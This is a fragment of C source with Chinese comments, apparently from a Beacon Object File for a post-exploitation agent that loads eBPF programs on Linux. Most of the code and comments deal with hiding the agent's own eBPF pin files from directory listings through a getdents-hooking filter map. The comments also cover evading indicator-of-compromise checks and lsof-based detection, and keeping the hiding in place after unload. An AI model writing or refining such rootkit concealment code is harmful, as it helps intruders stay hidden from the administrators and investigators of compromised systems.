    // hide_names 自己藏起来也照样通（过滤只作用在目录枚举上）。
    AxSetBpfPin(g_pin);

    // ── 6c. 把自己的 pin 文件也藏起来（完全体 D2 / §I 表 `ls /sys/fs/bpf`）──
    // 名字全部由 pin 名 + 后缀**拼**出来，一次枚举都不需要 —— 这正是 §6 去掉
    // 扫描之后才能做的事：反过来（先藏再扫）会当场自废，且不报错（见文件头 ISS-061）。
    //
    // ★ 关键事实（p21 首跑实测出来的）：hide_names 有**多份**，每个模块实例一张，
    //   但只有 **getdents 钩子**那一份会被读 —— 就是 `hide` 实例那张。别的实例的
    //   同名表**没人查**。首版把名字写进"自己那张"，于是 p21 加载 bpf_filter 时
    //   T5 显示 map 里确实有 9 条键、`ls /sys/fs/bpf` 却一条不少 —— 写了，但没人读。
    //   所以必须写进 **dirent pin**，而加载顺序不可控 → 靠 core §6d 的注册表补齐：
    //     · dirent 已加载 → 我顺手把自己的名字写进它
    //     · 我是 dirent   → 认领它，并把**已登记的全部 pin** 重放一遍
    //   两个半边合起来，hide 先加载或后加载都能全藏。
    // 必须在 6b 之后：AxSetBpfPin 要先记住 pin。
    // 预算：hide_names 硬上限 **32 条键**，一个模块约 9~10 条 → 4 个模块就撞上限。
    // 撞上时 MAP_UPDATE 只返回 -1，**不区分**"满"与别的原因，所以 hid/want 必须打出来。
    // 卸载侧**不回收**：unload 会 unpin 并关掉全部 fd，map 对象随之释放，在一张即将被
    // 销毁的表上删键是彻底的空操作（P8 §2.2，第一版这么写过、已回退）。要撤销隐藏
    // 只剩一条路：操作员手工 hide_del。
    // 只登记**确实 pin 了**的后缀：给不存在的名字建键是无害的，但会让
    // "键数 = 对象数"这个对账关系断掉，反而不好查。
    {
        static const char *sfx[9] = { "_prog", "_map0", "_map1", "_map2", "_map3",
                                      "_map4", "_map5", "_map6", "_map7" };
        char nm[192];
        int hid = 0, want = 0;
        // 判据是 **attach target 里有没有 getdents**（语义），不是模块文件名 ——
        // 文件名会被改（map 改名消 IOC 那条线），猜名字迟早静默失效。
        int is_dirent = (targetbuf[0] && AxStrstr(targetbuf, "getdents")) ? 1 : 0;
        const char *dst;

        AxPinRegAdd(g_pin);                                  // 先登记自己
        if (is_dirent) AxPinRegDirent(g_pin);                // 我是过滤器 → 认领
        dst = is_dirent ? g_pin : AxPinRegDirentPin();       // 写谁的表

        if (dst) {
            // 我是 dirent：把**已登记的全部 pin** 重放一遍（补上"hide 后加载"那半边）
            // 我不是：只藏自己（"hide 先加载"那半边由它加载时重放补上）
            int np = is_dirent ? AxPinRegCount() : 1;
            for (int k = 0; k < np; k++) {
                const char *p = is_dirent ? AxPinRegGet(k) : g_pin;
                if (!p) continue;
                for (int i = 0; i < 9; i++) {
                    AxStrcpy(nm, p);
                    AxStrcat(nm, sfx[i]);
                    want++;
                    if (AxHideNameAdd(dst, nm) == 0) hid++;
                }
            }
            if (g_link_id > 0) {                             // _link 只可能是本实例的
                AxStrcpy(nm, g_pin);
                AxStrcat(nm, "_link");
                want++;
                if (AxHideNameAdd(dst, nm) == 0) hid++;
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] ebpf_load: pin names hidden %d/%d -> dst='%s'%s (hide_names budget 32)\n",
            hid, want, dst ? dst : "(no getdents instance yet)",
            is_dirent ? " [I am the getdents filter]" : "");
    }

    // 成功路径以前是裸 `return;`，直接跳过了下面两个 close —— 于是每加载一个模块
    // 就在 agent 进程里永久漏掉 1 个 prog fd + 最多 8 个 map fd。后果有两个：
    //   (1) unload 之后 prog 不释放：pin 已 unlink、perf 已 detach，对象却被这个
    //       泄漏的 fd 吊着，只有 agent 进程死才消失（实测 id 705 存活过 t+15s）。
    //   (2) /proc/<pid>/fd 里常驻 9 个 anon_inode:bpf-*，正是门 S2 的 lsof 项。
    // pin 自己就持有对象引用，所以加载期的 fd 一律该关。
    goto done;

fail:
done:
    AxCloseFile((int)prog_fd);
fail_maps:
    for (int i = 0; i < 8; i++) if (map_fds[i] > 0) AxCloseFile(map_fds[i]);
    return;
}
